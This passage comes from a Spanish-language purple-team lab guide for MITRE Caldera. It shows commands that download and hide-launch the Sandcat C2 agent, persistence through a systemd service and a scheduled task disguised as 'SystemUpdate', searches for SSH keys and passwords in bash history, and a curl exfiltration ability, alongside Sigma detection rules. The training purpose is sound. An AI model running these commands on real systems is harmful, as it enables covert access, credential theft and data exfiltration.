El operador puede modificar ciertas propiedades del agente:

1. **Cambiar grupo**: Reasignar a otro grupo lÃ³gico
2. **Ajustar sleep interval**: Modificar frecuencia de beacons
3. **Matar agente**: Terminar la sesiÃ³n del agente

### Variantes de despliegue

#### Despliegue en Windows (PowerShell)

```powershell
$server="http://192.168.1.100:8888";
$url="$server/file/download";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go");
$wc.Headers.add("server",$server);
$wc.Headers.add("group","red");
$output="C:\Users\Public\sandcat.exe";
$wc.DownloadFile($url,$output);
Start-Process -FilePath $output -ArgumentList "-server $server" -WindowStyle hidden;
```

#### Despliegue en macOS

```bash
server="http://192.168.1.100:8888";
curl -s -X POST \
  -H "file:sandcat.go" \
  -H "platform:darwin" \
  -H "server:$server" \
  -H "group:red" \
  $server/file/download > /tmp/sandcat-darwin && \
chmod +x /tmp/sandcat-darwin && \
/tmp/sandcat-darwin -server $server -group red -v
```

#### Despliegue con canal C2 alternativo (TCP)

```bash
server="http://192.168.1.100:8888";
curl -s -X POST \
  -H "file:sandcat.go" \
  -H "platform:linux" \
  -H "server:$server" \
  -H "group:red" \
  -H "contact:tcp" \
  $server/file/download > /tmp/sandcat-linux && \
chmod +x /tmp/sandcat-linux && \
/tmp/sandcat-linux -server 192.168.1.100:7010 -contact tcp -group red
```

### Persistencia del agente (Ejercicio avanzado)

Para mantener el agente activo despuÃ©s de reinicios (solo para laboratorios controlados):

#### Linux (systemd)

```bash
# Crear servicio systemd
sudo cat > /etc/systemd/system/sandcat.service <<EOF
[Unit]
Description=Sandcat Agent
After=network.target

[Service]
Type=simple
ExecStart=/opt/sandcat/sandcat-linux -server http://192.168.1.100:8888 -group red
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# Habilitar y arrancar servicio
sudo systemctl daemon-reload
sudo systemctl enable sandcat.service
sudo systemctl start sandcat.service
```

#### Windows (Scheduled Task)

```powershell
$action = New-ScheduledTaskAction -Execute "C:\Users\Public\sandcat.exe" -Argument "-server http://192.168.1.100:8888"
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "SystemUpdate" -Description "System Update Service"
```

### Consideraciones de detecciÃ³n (Perspectiva Blue Team)

#### Indicadores de compromiso (IOCs)

1. **Proceso sospechoso**:
   - Nombre: `splunkd` (pero sin Splunk instalado)
   - UbicaciÃ³n inusual: `/tmp/`, `C:\Users\Public\`

2. **Conexiones de red**:
   - Beacons HTTP regulares cada 30-60 segundos
   - ConexiÃ³n persistente a puerto 8888

3. **Artefactos de sistema de archivos**:
   - Binario en directorios temporales
   - Permisos de ejecuciÃ³n recientes

#### DetecciÃ³n con herramientas estÃ¡ndar

```bash
# Buscar procesos sospechosos
ps aux | grep -i sandcat
ps aux | grep -i splunkd

# Verificar conexiones de red activas
netstat -antp | grep 8888
ss -antp | grep 8888

# Monitorear con Sysmon (Windows)
# Event ID 3: Network Connection
# Event ID 1: Process Creation
```

### Preguntas de reflexiÃ³n

1. Â¿QuÃ© tipo de trÃ¡fico de red genera el agente al hacer beacon?
2. Â¿CÃ³mo podrÃ­a un EDR detectar este agente?
3. Â¿QuÃ© tÃ©cnica ATT&CK representa el despliegue inicial del agente?
4. Â¿CÃ³mo se verÃ­a diferente el despliegue en un escenario de phishing real?

### Resultado esperado

Al finalizar este laboratorio, el estudiante habrÃ¡:

âœ“ Desplegado exitosamente un agente Sandcat
âœ“ Establecido comunicaciÃ³n C2 con el servidor Caldera
âœ“ Comprendido las propiedades y metadata del agente
âœ“ Explorado opciones de despliegue multiplataforma
âœ“ Reflexionado sobre indicadores de detecciÃ³n

<hr style="border: none; height: 10px; background-color: #003b00;" />

## <font color="#87CEEB">4. Laboratorio 2 - OperaciÃ³n de descubrimiento con adversario "Check"</font>

<hr style="border: none; height: 10px; background-color: #003b00;" />

### Objetivos del laboratorio

1. Crear y ejecutar la primera operaciÃ³n en Caldera
2. Utilizar un adversario pre-construido
3. Observar la ejecuciÃ³n de tÃ©cnicas ATT&CK
4. Analizar resultados y facts descubiertos
5. Comprender el flujo de una operaciÃ³n

### Requisitos previos

- Servidor Caldera ejecutÃ¡ndose
- Al menos un agente desplegado y activo (Laboratorio 1 completado)
- Agente en estado "alive" o "trusted"

### Escenario del laboratorio

Se ejecutarÃ¡ el adversario **"Check"** contra el agente desplegado. Este adversario realiza reconocimiento bÃ¡sico del sistema para verificar la configuraciÃ³n de la plataforma y recopilar informaciÃ³n del entorno.

### Paso 1: Navegar a la pestaÃ±a de Operaciones

1. En la interfaz web de Caldera, hacer clic en **"Operations"** en el menÃº lateral
2. Observar la lista de operaciones existentes (puede estar vacÃ­a inicialmente)
3. Hacer clic en el botÃ³n **"+"** para crear una nueva operaciÃ³n

### Paso 2: Configurar la operaciÃ³n

Se presentarÃ¡ un formulario de configuraciÃ³n. Completar los siguientes campos:

| Campo | Valor | ExplicaciÃ³n |
|-------|-------|-------------|
| **Name** | `Lab2-Discovery` | Nombre identificador de la operaciÃ³n |
| **Adversary** | `Check` | Perfil de adversario a ejecutar |
| **Group** | `red` | Grupo de agentes objetivo |
| **Planner** | `atomic` | Planificador por defecto (ejecuciÃ³n secuencial) |
| **Source** | `None` | Sin facts iniciales requeridos |
| **Autonomous** | `1` | Modo automÃ¡tico (ejecuciÃ³n completa sin intervenciÃ³n) |
| **Obfuscator** | `plain-text` | Sin ofuscaciÃ³n (para facilitar aprendizaje) |
| **Jitter** | `2/8` | AleatorizaciÃ³n de Â±2 segundos en beacons |

#### ExplicaciÃ³n de campos clave

**Autonomous = 1 (AutomÃ¡tico)**
- El planificador ejecutarÃ¡ todas las habilidades sin intervenciÃ³n del operador
- Ideal para emulaciÃ³n completa de adversarios

**Autonomous = 0 (Manual)**
- El operador debe aprobar cada habilidad antes de ejecutar
- Ãštil para entrenamiento paso a paso

**Jitter "2/8"**
- Agrega Â±2 segundos de variaciÃ³n aleatoria
- Ayuda a evadir detecciÃ³n basada en patrones de tiempo
- El segundo nÃºmero (8) no se usa en versiÃ³n actual

### Paso 3: Iniciar la operaciÃ³n

1. Hacer clic en el botÃ³n **"Start"**
2. La operaciÃ³n cambiarÃ¡ a estado **"running"**
3. La interfaz mostrarÃ¡ la vista de la cadena de ataque (attack chain)

### Paso 4: Observar la ejecuciÃ³n en tiempo real

#### Vista de cadena de ataque (Chain View)

La interfaz mostrarÃ¡ un grafo dirigido donde:

- **Nodos**: Representan habilidades ejecutadas
- **Colores**:
  - ğŸŸ¢ **Verde**: EjecuciÃ³n exitosa
  - ğŸŸ¡ **Amarillo**: En ejecuciÃ³n
  - ğŸ”´ **Rojo**: FallÃ³
  - âšª **Gris**: Pendiente
- **Conexiones**: Indican dependencias y flujo de facts

#### Ejemplo de flujo del adversario "Check"

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Enumerate System Info   â”‚  (T1082)
â”‚    (whoami, hostname)   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
            â”‚
            â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Network Configuration   â”‚  (T1016)
â”‚    (ifconfig, ipconfig) â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
            â”‚
            â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Environment Variables   â”‚  (T1082)
â”‚        (env, set)       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Paso 5: Examinar detalles de ejecuciÃ³n

1. **Hacer clic en un nodo** de la cadena de ataque
2. Se abrirÃ¡ un panel lateral con informaciÃ³n detallada:

#### InformaciÃ³n del Link (EjecuciÃ³n de habilidad)

| SecciÃ³n | Contenido |
|---------|-----------|
| **Ability** | Nombre y descripciÃ³n de la habilidad |
| **ATT&CK** | TÃ©cnica y tÃ¡ctica (ej: T1082 - System Information Discovery) |
| **Command** | Comando exacto ejecutado en el sistema |
| **Output** | Resultado de la ejecuciÃ³n |
| **Status** | Estado (0=Ã©xito, -1=fallo) |
| **Facts Collected** | Datos extraÃ­dos por parsers |

#### Ejemplo de comando ejecutado

**Habilidad**: Get System Information (Linux)

```bash
# Comando
whoami; hostname; uname -a; cat /etc/os-release

# Output
kali
ubuntu-lab
Linux ubuntu-lab 5.15.0-56-generic #62-Ubuntu SMP x86_64 GNU/Linux
NAME="Ubuntu"
VERSION="22.04.1 LTS (Jammy Jellyfish)"
ID=ubuntu
ID_LIKE=debian
```

**Facts descubiertos**:
- `host.user.name: kali`
- `host.name: ubuntu-lab`
- `host.os.kernel: 5.15.0-56-generic`

### Paso 6: Analizar facts recopilados

1. Hacer clic en la pestaÃ±a **"Facts"** dentro de la operaciÃ³n
2. Observar todos los facts descubiertos durante la operaciÃ³n

#### Tipos de facts comunes

| Trait | Ejemplo | Uso posterior |
|-------|---------|---------------|
| `host.user.name` | `kali` | Credenciales, contexto de privilegios |
| `host.name` | `ubuntu-lab` | IdentificaciÃ³n de objetivo |
| `remote.host.ip` | `192.168.1.50` | Movimiento lateral |
| `host.dir.staged` | `/tmp/.caldera` | Almacenamiento temporal |
| `network.adapter.ip` | `10.0.2.15` | Mapeo de red |

#### Encadenamiento de facts

Los facts permiten que habilidades posteriores se adapten dinÃ¡micamente:

```yaml
# Habilidad 1 descubre IP remota
arp -a  â†’  Descubre: remote.host.ip = 192.168.1.50

# Habilidad 2 usa esa IP para copiar archivo
Copy-Item sandcat.exe \\#{remote.host.ip}\C$\Users\Public\
```

### Paso 7: Revisar mapeo ATT&CK

1. En la vista de operaciÃ³n, hacer clic en **"ATT&CK Coverage"** (si estÃ¡ disponible)
2. Alternativamente, usar el plugin **Compass** para visualizar cobertura

#### TÃ©cnicas ATT&CK ejecutadas por "Check"

| ID TÃ©cnica | Nombre | DescripciÃ³n |
|------------|--------|-------------|
| **T1082** | System Information Discovery | Recopilar informaciÃ³n del sistema y configuraciÃ³n |
| **T1016** | System Network Configuration Discovery | Descubrir configuraciÃ³n de red |
| **T1033** | System Owner/User Discovery | Identificar usuarios del sistema |
| **T1124** | System Time Discovery | Obtener fecha/hora del sistema |

### Paso 8: FinalizaciÃ³n de la operaciÃ³n

#### Estados finales posibles

- **finished**: Todas las habilidades ejecutadas exitosamente
- **out_of_time**: Timeout de operaciÃ³n alcanzado
- **paused**: Pausada manualmente por el operador

#### Acciones post-operaciÃ³n

1. **Descargar reporte**:
   - Hacer clic en **"Download Report"**
   - Formatos disponibles: JSON, CSV
   - Contiene timeline completo de ejecuciÃ³n

2. **Cleanup (Limpieza)**:
   - Hacer clic en botÃ³n **"Cleanup"**
   - Ejecuta comandos de limpieza definidos en habilidades
   - Elimina artefactos dejados en el sistema

### Paso 9: AnÃ¡lisis del reporte JSON

El reporte descargado contiene informaciÃ³n estructurada:

```json
{
  "name": "Lab2-Discovery",
  "start": "2025-11-22T10:30:00",
  "finish": "2025-11-22T10:35:00",
  "steps": [
    {
      "ability_id": "4e97e699-93d7-4040-b5a3-2e906a58199e",
      "ability_name": "Get System Information",
      "tactic": "discovery",
      "technique_id": "T1082",
      "command": "whoami; hostname; uname -a",
      "output": "kali\nubuntu-lab\nLinux...",
      "status": 0,
      "timestamp": "2025-11-22T10:30:15"
    }
  ],
  "facts": {
    "host.user.name": ["kali"],
    "host.name": ["ubuntu-lab"]
  }
}
```

### Ejercicio avanzado: OperaciÃ³n manual paso a paso

Repetir la operaciÃ³n con configuraciÃ³n diferente:

1. Crear nueva operaciÃ³n: `Lab2-Discovery-Manual`
2. Configurar **Autonomous = 0** (manual)
3. Iniciar operaciÃ³n
4. Observar que las habilidades quedan en espera
5. Hacer clic en **"Run one link"** para ejecutar cada habilidad individualmente
6. Analizar resultados entre cada paso

#### Ventajas del modo manual

- Permite anÃ¡lisis profundo entre pasos
- Ãštil para entrenamiento y comprensiÃ³n
- Posibilidad de modificar facts antes de siguiente paso

### ComparaciÃ³n con detecciÃ³n Blue Team

#### TelemetrÃ­a generada (Perspectiva defensiva)

1. **EjecuciÃ³n de procesos**:
   ```bash
   # Linux auditd logs
   type=EXECVE msg=audit(1234567890.123:456): argc=3 a0="whoami" a1="hostname" a2="uname"
   ```

2. **Logs de Sysmon (Windows)**:
   - Event ID 1: Process Creation (`whoami.exe`, `hostname.exe`)
   - Event ID 10: Process Access (acceso a LSASS si se ejecuta mimikatz)

3. **Comandos sospechosos en secuencia rÃ¡pida**:
   - `whoami` â†’ `hostname` â†’ `ipconfig` â†’ `net user`
   - PatrÃ³n tÃ­pico de reconocimiento post-explotaciÃ³n

#### Reglas de detecciÃ³n Sigma (ejemplo)

```yaml
title: Rapid Discovery Commands Execution
description: Detects multiple discovery commands in short timeframe
status: experimental
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    CommandLine|contains:
      - 'whoami'
      - 'hostname'
      - 'uname -a'
      - 'cat /etc/os-release'
  timeframe: 60s
  condition: selection | count(CommandLine) > 3
level: medium
```

### Preguntas de reflexiÃ³n

1. Â¿QuÃ© facts fueron mÃ¡s valiosos para operaciones posteriores?
2. Â¿CÃ³mo se verÃ­a esta actividad en un SIEM?
3. Â¿QuÃ© tÃ©cnicas adicionales ejecutarÃ­a un atacante real despuÃ©s de descubrimiento?
4. Â¿CÃ³mo podrÃ­a ofuscarse esta actividad para evadir detecciÃ³n?

### Resultado esperado

Al finalizar este laboratorio, el estudiante habrÃ¡:

âœ“ Creado y ejecutado una operaciÃ³n completa en Caldera
âœ“ Observado la ejecuciÃ³n de tÃ©cnicas ATT&CK en tiempo real
âœ“ Analizado facts descubiertos y su encadenamiento
âœ“ Comprendido el mapeo de acciones a framework ATT&CK
âœ“ Descargado y analizado reportes de operaciÃ³n
âœ“ Reflexionado sobre detecciÃ³n desde perspectiva Blue Team

<hr style="border: none; height: 10px; background-color: #003b00;" />

## <font color="#87CEEB">5. Laboratorio 3 - SimulaciÃ³n de ataque multi-etapa personalizado</font>

<hr style="border: none; height: 10px; background-color: #003b00;" />

### Objetivos del laboratorio

1. Crear un perfil de adversario personalizado
2. Construir una cadena de ataque multi-etapa
3. Ejecutar operaciÃ³n que simule un escenario de ataque real
4. Analizar el encadenamiento de tÃ©cnicas y facts
5. Evaluar el impacto y cobertura ATT&CK

### Requisitos previos

- Completar Laboratorio 1 (agente desplegado)
- Completar Laboratorio 2 (comprensiÃ³n de operaciones)
- Agente activo con privilegios de usuario estÃ¡ndar
- (Opcional) Segundo sistema para simular movimiento lateral

### Escenario del laboratorio

Se simularÃ¡ un adversario que realiza las siguientes fases:

1. **Discovery (Descubrimiento)**: Reconocimiento del entorno
2. **Credential Access (Acceso a credenciales)**: BÃºsqueda de credenciales locales
3. **Collection (RecolecciÃ³n)**: IdentificaciÃ³n de datos sensibles
4. **Exfiltration (ExfiltraciÃ³n)**: SimulaciÃ³n de extracciÃ³n de datos

### Fase 1: ExploraciÃ³n de habilidades disponibles

#### Paso 1: Navegar al catÃ¡logo de habilidades

1. En Caldera, hacer clic en **"Abilities"** en el menÃº lateral
2. Explorar el catÃ¡logo organizado por tÃ¡cticas ATT&CK
3. Utilizar filtros para buscar habilidades especÃ­ficas

#### Paso 2: Seleccionar habilidades para el adversario

Para este laboratorio, se seleccionarÃ¡n las siguientes habilidades:

##### Discovery (T1018, T1082, T1016)

| ID Habilidad | Nombre | TÃ©cnica | Plataforma |
|--------------|--------|---------|------------|
| `85341c8c-4ecb-4579-8f53-43e3e91d7617` | Collect ARP details | T1018 | Linux/Windows |
| `4e97e699-93d7-4040-b5a3-2e906a58199e` | Get System Information | T1082 | Linux |
| `f3132740-c0a6-4f78-8934-d0a09b9a9e85` | Network Configuration | T1016 | Linux |

##### Credential Access (T1552, T1555)

| ID Habilidad | Nombre | TÃ©cnica | Plataforma |
|--------------|--------|---------|------------|
| `bd527b63-9f9e-46e0-9816-b8434d2b9989` | Find SSH keys | T1552.004 | Linux |
| `7c42a30c-c8c7-44c5-80a8-862d364ac1e4` | Search bash history | T1552.003 | Linux |

##### Collection (T1005, T1119)

| ID Habilidad | Nombre | TÃ©cnica | Plataforma |
|--------------|--------|---------|------------|
| `90c2efaa-8205-480d-8bb6-61d90dbaf81b` | Find sensitive files | T1005 | Linux/Windows |
| `6469befa-748a-4b9c-a96d-f191fde47d89` | Staged directory | T1074.001 | Linux |

### Fase 2: Crear adversario personalizado

#### Paso 1: Crear archivo YAML de adversario

En un entorno de desarrollo de Caldera, crear el archivo:
`/data/adversaries/custom-lab3-adversary.yml`

```yaml
---
id: aaaaaaaa-1111-2222-3333-bbbbbbbbbbbb
name: Lab3-DataThief
description: Adversario de laboratorio que simula descubrimiento, acceso a credenciales y recolecciÃ³n de datos
atomic_ordering:
  # Fase 1: Discovery
  - 85341c8c-4ecb-4579-8f53-43e3e91d7617  # Collect ARP details (T1018)
  - 4e97e699-93d7-4040-b5a3-2e906a58199e  # Get System Information (T1082)
  - f3132740-c0a6-4f78-8934-d0a09b9a9e85  # Network Configuration (T1016)

  # Fase 2: Credential Access
  - bd527b63-9f9e-46e0-9816-b8434d2b9989  # Find SSH keys (T1552.004)
  - 7c42a30c-c8c7-44c5-80a8-862d364ac1e4  # Search bash history (T1552.003)

  # Fase 3: Collection
  - 90c2efaa-8205-480d-8bb6-61d90dbaf81b  # Find sensitive files (T1005)
  - 6469befa-748a-4b9c-a96d-f191fde47d89  # Create staged directory (T1074.001)
```

#### Paso 2: Cargar adversario en Caldera

**OpciÃ³n A: VÃ­a interfaz web**
1. Navegar a **"Adversaries"**
2. Hacer clic en **"+"** para crear nuevo adversario
3. Completar formulario manualmente seleccionando habilidades
4. Guardar con nombre `Lab3-DataThief`

**OpciÃ³n B: VÃ­a API REST**

```bash
curl -X POST http://localhost:8888/api/v2/adversaries \
  -H "KEY: ADMIN123" \
  -H "Content-Type: application/json" \
  -d @custom-lab3-adversary.json
```

**OpciÃ³n C: Copiar archivo YAML** (mÃ¡s simple para laboratorio)

```bash
# Copiar archivo a directorio de adversarios de usuario
cp custom-lab3-adversary.yml /home/user/Caldera/5.3.0/data/adversaries/
```

Luego reiniciar Caldera o recargar configuraciÃ³n.

### Fase 3: Configurar fuente de facts inicial (opcional)

Para un escenario mÃ¡s realista, se pueden definir facts iniciales que el adversario "conocerÃ­a":

Archivo: `/data/sources/lab3-initial-knowledge.yml`

```yaml
---
id: bbbbbbbb-2222-3333-4444-cccccccccccc
name: Lab3-InitialKnowledge
facts:
  - trait: host.user.name
    value: kali
  - trait: network.domain.name
    value: lab.local
  - trait: caldera.server.ip
    value: 192.168.1.100
```

### Fase 4: Ejecutar la operaciÃ³n personalizada

#### Paso 1: Crear operaciÃ³n

1. Navegar a **"Operations"**
2. Hacer clic en **"+"**
3. Configurar:

| Campo | Valor |
|-------|-------|
| **Name** | `Lab3-DataTheft-Simulation` |
| **Adversary** | `Lab3-DataThief` |
| **Group** | `red` |
| **Planner** | `atomic` |
| **Source** | `Lab3-InitialKnowledge` (si se creÃ³) |
| **Autonomous** | `1` |
| **Obfuscator** | `plain-text` |
| **Jitter** | `4/8` |

#### Paso 2: Iniciar y monitorear

1. Hacer clic en **"Start"**
2. Observar la cadena de ataque que se construye en tiempo real
3. Monitorear el progreso por fases

### Fase 5: AnÃ¡lisis detallado de cada fase

#### Fase 1: Discovery (Descubrimiento)

**Habilidad 1: Collect ARP details (T1018)**

```bash
# Comando ejecutado
arp -a

# Salida esperada
? (192.168.1.1) at 00:0c:29:3e:1f:4a [ether] on eth0
? (192.168.1.50) at 00:0c:29:4f:2e:5b [ether] on eth0
? (192.168.1.100) at 00:0c:29:5g:3f:6c [ether] on eth0

# Facts descubiertos
remote.host.ip: 192.168.1.1
remote.host.ip: 192.168.1.50
remote.host.ip: 192.168.1.100
```

**Uso tÃ¡ctico**: Mapear hosts activos en la red local para potencial movimiento lateral.

**Habilidad 2: Get System Information (T1082)**

```bash
# Comando ejecutado
whoami; hostname; uname -a; cat /etc/os-release

# Facts descubiertos
host.user.name: kali
host.name: ubuntu-lab
host.os.kernel: 5.15.0-56-generic
host.os.version: Ubuntu 22.04.1 LTS
```

**Uso tÃ¡ctico**: Determinar contexto de privilegios y plataforma para adaptar tÃ©cnicas posteriores.

**Habilidad 3: Network Configuration (T1016)**

```bash
# Comando ejecutado
ifconfig

# Facts descubiertos
network.adapter.ip: 192.168.1.20
network.adapter.ip: 10.0.2.15  # Posible segunda interfaz
```

**Uso tÃ¡ctico**: Identificar segmentos de red accesibles.

#### Fase 2: Credential Access (Acceso a credenciales)

**Habilidad 4: Find SSH keys (T1552.004)**

```bash
# Comando ejecutado
find /home -name id_rsa -o -name id_dsa -o -name *.pem 2>/dev/null

# Salida esperada
/home/kali/.ssh/id_rsa
/home/kali/.ssh/backup_key.pem

# Facts descubiertos
host.file.path: /home/kali/.ssh/id_rsa
host.file.path: /home/kali/.ssh/backup_key.pem
```

**Uso tÃ¡ctico**: Claves SSH descubiertas pueden usarse para acceso a otros sistemas.

**Habilidad 5: Search bash history (T1552.003)**

```bash
# Comando ejecutado
cat ~/.bash_history | grep -E 'password|passwd|ssh|mysql|ftp'

# Salida potencial
ssh admin@192.168.1.50
mysql -u root -p'MySecretP@ss123'
ftp backup@192.168.1.60

# Facts descubiertos
credential.user: root
credential.password: MySecretP@ss123
remote.host.ip: 192.168.1.60
```

**Uso tÃ¡ctico**: Credenciales en histÃ³rico bash pueden reutilizarse para acceso lateral.

#### Fase 3: Collection (RecolecciÃ³n)

**Habilidad 6: Find sensitive files (T1005)**

```bash
# Comando ejecutado
find /home -type f \( -name *password* -o -name *credential* -o -name *.key \) 2>/dev/null

# Salida esperada
/home/kali/Documents/passwords.txt
/home/kali/Documents/vpn_credentials.conf
/home/kali/.ssh/id_rsa

# Facts descubiertos
file.sensitive.path: /home/kali/Documents/passwords.txt
file.sensitive.path: /home/kali/Documents/vpn_credentials.conf
```

**Uso tÃ¡ctico**: Identificar datos de alto valor para exfiltraciÃ³n.

**Habilidad 7: Create staged directory (T1074.001)**

```bash
# Comando ejecutado
mkdir -p /tmp/.hidden_staging

# Facts descubiertos
host.dir.staged: /tmp/.hidden_staging
```

**Uso tÃ¡ctico**: Directorio para agrupar archivos antes de exfiltraciÃ³n (tÃ©cnica real de APTs).

### Fase 6: VisualizaciÃ³n de la cadena de ataque

La cadena de ataque mostrarÃ¡ el flujo completo:

```
[T1018 ARP Scan] â†’ Descubre IPs remotas
       â†“
[T1082 System Info] â†’ Descubre usuario/OS
       â†“
[T1016 Network Config] â†’ Descubre interfaces
       â†“
[T1552.004 SSH Keys] â†’ Encuentra claves privadas
       â†“
[T1552.003 Bash History] â†’ Extrae credenciales
       â†“
[T1005 Sensitive Files] â†’ Identifica archivos objetivo
       â†“
[T1074.001 Staging Dir] â†’ Prepara exfiltraciÃ³n
```

### Fase 7: AnÃ¡lisis de cobertura ATT&CK

#### Matriz de cobertura

| TÃ¡ctica | TÃ©cnicas cubiertas | % de sub-tÃ©cnicas |
|---------|-------------------|-------------------|
| Discovery | T1018, T1082, T1016 | 3/30 (10%) |
| Credential Access | T1552.003, T1552.004 | 2/13 (15%) |
| Collection | T1005 | 1/17 (6%) |
| Command and Control | T1071 (implÃ­cito por C2) | 1/16 (6%) |

**ObservaciÃ³n**: Este adversario cubre 4 de 14 tÃ¡cticas ATT&CK, con enfoque en fases tempranas del kill chain.

### Fase 8: SimulaciÃ³n de defensa (Perspectiva Blue Team)

#### TelemetrÃ­a generada

1. **Logs de comandos ejecutados** (auditd, Sysmon):
   ```
   10:45:12 - arp -a
   10:45:18 - whoami
   10:45:19 - hostname
   10:45:20 - uname -a
   10:45:25 - find /home -name id_rsa
   10:45:30 - cat ~/.bash_history
   ```

2. **Accesos a archivos sensibles**:
   ```
   File Access: /home/kali/.ssh/id_rsa
   File Access: /home/kali/.bash_history
   ```

3. **CreaciÃ³n de directorios sospechosos**:
   ```
   Directory Created: /tmp/.hidden_staging
   ```

#### Reglas de detecciÃ³n recomendadas

**Sigma Rule: Credential Enumeration**

```yaml
title: SSH Key and Bash History Enumeration
description: Detects enumeration of SSH keys and bash history
logsource:
  product: linux
  service: auditd
detection:
  selection_ssh:
    exe: '/usr/bin/find'
    arguments|contains: 'id_rsa'
  selection_history:
    exe: '/bin/cat'
    arguments|contains: '.bash_history'
  condition: selection_ssh or selection_history
level: medium
tags:
  - attack.credential_access
  - attack.t1552.004
  - attack.t1552.003
```

**EDR Alert: Rapid Discovery Commands**

Un EDR configurado adecuadamente deberÃ­a alertar sobre:
- EjecuciÃ³n secuencial rÃ¡pida de comandos de descubrimiento
- Acceso a `.bash_history` por proceso no interactivo
- `find` buscando patrones de claves privadas
- CreaciÃ³n de directorios ocultos en `/tmp`

### Ejercicio de extensiÃ³n

#### Agregar fase de exfiltraciÃ³n

Modificar el adversario para incluir:

```yaml
# Fase 4: Exfiltration (agregar al adversario)
  - 3b5db901-2cb8-4df7-8043-c4628a6a5d5a  # Exfil via cURL POST
```

**Habilidad de exfiltraciÃ³n** (ejemplo):

```yaml
name: Exfiltrate staged data
description: Exfiltrar archivos desde directorio de staging
tactic: exfiltration
technique:
  attack_id: T1041
  name: Exfiltration Over C2 Channel
platforms:
  linux:
    sh:
      command: |
        tar czf /tmp/exfil.tar.gz #{host.dir.staged}
        curl -X POST -F "file=@/tmp/exfil.tar.gz" http://#{caldera.server.ip}:8888/file/upload
      cleanup: |
        rm -f /tmp/exfil.tar.gz
        rm -rf #{host.dir.staged}
```

### Preguntas de reflexiÃ³n

1. Â¿CÃ³mo se encadenaron los facts entre habilidades?
2. Â¿QuÃ© tÃ©cnica fue mÃ¡s ruidosa desde perspectiva de detecciÃ³n?
3. Â¿CÃ³mo podrÃ­a un atacante real ofuscar estos comandos?
4. Â¿QuÃ© controles de seguridad prevendrÃ­an esta cadena de ataque?
5. Â¿QuÃ© tÃ©cnicas adicionales completarÃ­an un ataque de ransomware?

### Resultado esperado

Al finalizar este laboratorio, el estudiante habrÃ¡:

âœ“ Creado un adversario personalizado con mÃºltiples fases
âœ“ Ejecutado operaciÃ³n multi-etapa que simula ataque real
âœ“ Analizado encadenamiento de tÃ©cnicas y facts
âœ“ Comprendido cobertura ATT&CK de un adversario
âœ“ Evaluado telemetrÃ­a generada desde perspectiva defensiva
âœ“ Reflexionado sobre detecciÃ³n y prevenciÃ³n

<hr style="border: none; height: 10px; background-color: #003b00;" />

## <font color="#87CEEB">6. AnÃ¡lisis de resultados y perspectiva Purple Team</font>

<hr style="border: none; height: 10px; background-color: #003b00;" />

### ComprensiÃ³n del flujo Purple Team

El concepto de **Purple Team** surge de la colaboraciÃ³n entre:

- ğŸ”´ **Red Team**: Emula adversarios para probar defensas
- ğŸ”µ **Blue Team**: Detecta, responde y mejora defensas
- ğŸŸ£ **Purple Team**: Facilita colaboraciÃ³n y aprendizaje mutuo

Caldera es una herramienta ideal para ejercicios Purple Team porque:

1. **Ataques reproducibles**: Mismas tÃ©cnicas pueden repetirse para validar mejoras
2. **TelemetrÃ­a documentada**: Salida conocida facilita creaciÃ³n de reglas de detecciÃ³n
3. **Mapeo ATT&CK**: Lenguaje comÃºn entre atacantes y defensores
4. **Control total**: Operaciones controladas en entorno seguro

### AnÃ¡lisis de resultados de operaciÃ³n

#### Descarga y formato de reportes

Caldera proporciona mÃºltiples formatos de reporte:

1. **JSON (Estructurado)**:
   - Ideal para anÃ¡lisis automatizado
   - Puede importarse en SIEM o herramientas de anÃ¡lisis
   - Contiene metadata completa de cada link

2. **CSV (Tabular)**:
   - FÃ¡cil de importar en hojas de cÃ¡lculo
   - Ãštil para anÃ¡lisis estadÃ­stico
   - Columnas: timestamp, ability, command, output, status

#### Estructura del reporte JSON

```json
{
  "operation": {
    "name": "Lab3-DataTheft-Simulation",
    "start_time": "2025-11-22T10:00:00Z",
    "finish_time": "2025-11-22T10:15:00Z",
    "adversary": "Lab3-DataThief",
    "jitter": "4/8",
    "planner": "atomic",
    "state": "finished"
  },
  "agents": [
    {
      "paw": "c3f4a7b2",
      "hostname": "ubuntu-lab",
      "platform": "linux",
      "executors": ["sh", "bash"],
      "privilege": "User"
    }
  ],
  "links": [
    {
      "id": "link-001",
      "ability": {
        "ability_id": "85341c8c-4ecb-4579-8f53-43e3e91d7617",
        "name": "Collect ARP details",
        "tactic": "discovery",
        "technique_id": "T1018",
        "technique_name": "Remote System Discovery"
      },
      "executor": "sh",
      "command": "arp -a",
      "output": "? (192.168.1.1) at 00:0c:29:3e:1f:4a...",
      "status": 0,
      "timestamp": "2025-11-22T10:01:15Z",
      "facts": [
        {"trait": "remote.host.ip", "value": "192.168.1.1"},
        {"trait": "remote.host.ip", "value": "192.168.1.50"}
      ]
    }
  ],
  "facts_discovered": {
    "remote.host.ip": ["192.168.1.1", "192.168.1.50", "192.168.1.100"],
    "host.user.name": ["kali"],
    "host.file.path": ["/home/kali/.ssh/id_rsa"]
  }
}
```

### Uso del Plugin Debrief

El plugin **Debrief** proporciona anÃ¡lisis detallado post-operaciÃ³n.

#### Acceso a Debrief

1. Navegar a **Plugins** â†’ **Debrief**
2. Seleccionar operaciÃ³n completada
3. Generar reporte de debriefing

